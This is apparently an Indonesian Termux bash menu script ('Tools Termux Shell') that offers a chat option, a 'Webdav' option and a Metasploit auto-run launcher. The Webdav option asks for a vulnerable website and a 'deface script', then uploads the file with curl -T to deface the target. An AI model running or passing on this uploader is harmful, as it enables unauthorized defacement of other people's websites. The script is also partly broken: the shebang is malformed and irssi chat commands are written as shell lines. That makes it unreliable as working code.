#!\bin\bash
# Pembuat : By M Alifio
# Tools Termux Shell
# Kalau Recode Cantumin Nama Pembuat Tools Aslinya!!
/data/data/com.termux/files/home/Tools/file
clear

#color
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'


echo "  ____________________
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║▒▒▒▒▒▒▒▒▒▒║
   ║██████████╚╗
   ║██╔══╗█╔═╗█║        T O O L S        B Y
   ║██║╬╔╝█╚╗║█║        =====================
   ║██╚═╝█║█╚╝█║        ╔══╗╔╗─╔══╗╔══╗╔══╗╔═╗
   ╚╗██████████║        ║╔╗║║║─╚║║╝║═╦╝╚║║╝║║║ 
    ╚╗║╠╩╩╩╩╩╝          ║╠╣║║╚╗╔║║╗║╔╝─╔║║╗║║║
     ║║┈┈┈█▐█████▒.｡oO  ╚╝╚╝╚═╝╚══╝╚╝──╚══╝╚═╝
     ║██╠╦╦╦╗           ======================
     ╚╗██████
      ╚════╝ *_* Isi dengan Benar namamu*_*" | lolcat
echo "=====================================" | lolcat
echo -n "Waktu : " | lolcat ; date | lolcat
echo -n "Masukan Nama anda : " | lolcat ;
read nama
sleep 2
echo
echo "[√] Nama Sudah Disetujui! " | lolcat
sleep 2
sleep 2
clear
echo $r"╲╲"$w"┏━━┓"$r"╲╲"$y"Author :"$c"M Alifio"
echo $r"╲━"$w"╋━━╋"$r"━╲"$y"Whatsapp :"$c"0812xxxxxxx"
echo $r"╲╲"$w"┃◯◯┃"$r"╲╲"$y"Instagram :"$c"@m_alifio"
echo $r"╲"$w"┏╯┈◣┃"$r"╲╲"$y"github :"$c"https://github.com/alifiogans"
echo $r"╲"$w"╰━┳┳╯"$r"╲╲"$y"telegram :"$c"https://t.me/alifio"
echo $r"▔▔▔"$w"┗┗"$r"▔▔▔"
echo "${w}____________________*_*_____________________"
sleep 1
sleep 1
echo
echo "${g}[✚]Selamat Datang $nama";
sleep 2
echo
echo $r"============="$y"=============="$g"=============="
echo "${y}[ 1 ] Bot Chatting"                   $g"                   [✔]"
sleep 2
echo "${y}[ 2 ] Webdav"                         $g"                         [✔] "
sleep 2
echo "${y}[ 3 ] Metasploit Auto-Run"            $g"            [✔]"
sleep 2
echo "${y}[ 4 ] Install Bahan² nya Cuk!"        $g"        [✔] "
echo "${g}"
read -p "Pilih : " pilih;
if [ $pilih = "1" ];
then
    cd $HOME
    irssi
    /connect chat.freenode.net
    /nick $nama
    read nama
    /join #FIOteam
    fi
if [ $pilih = "2" ];
then
    cd $HOME
    clear
    echo $r"_ _ _ ____ ___  ___  ____ _  _ 
| | | |___ |__] |  \ |__| |  | 
|_|_| |___ |__] |__/ |  |  \/"
    echo $g"["$c"✺"$g"]" $w"masukkan web vuln mu"
    echo $r"Contoh : https://www.website.com"
    read -p "target : " target
    echo $g"["$c"✺"$g"]" $w "masukkan sc deface andalan mu"
    echo "${r}Contoh : index.html"
    read -p "script :" sc
    curl -T /storage/emulated/0/$sc $target
    echo $g"["$c"✔"$g"]" $w"cek web :" $target"/"$sc
    echo $r"_______________________*"$w"_*_____________________"
    fi
if [ $pilih = "3" ];
then
    clear
    cd AutoMetasploit
    sh Auto-Run.sh
    fi
if [ $pilih = "4" ];
then
    cd $HOME
    pkg install irssi
    pkg install lolcat
    gem install lolcat
    pip 2 install mechanize
    pkg install bash
    pkg install git
    fi
